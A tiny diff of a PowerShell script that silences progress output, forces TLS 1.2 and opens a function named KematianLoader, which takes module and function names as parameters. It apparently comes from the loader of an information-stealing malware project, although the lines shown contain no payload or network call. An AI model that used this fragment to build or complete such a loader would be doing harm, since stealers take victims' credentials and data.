@@ -1,4 +1,4 @@
-$ProgressPreference = 'Ignore'
+$ProgressPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 function KematianLoader  {
     Param ($kematian_modules, $kematian_func)
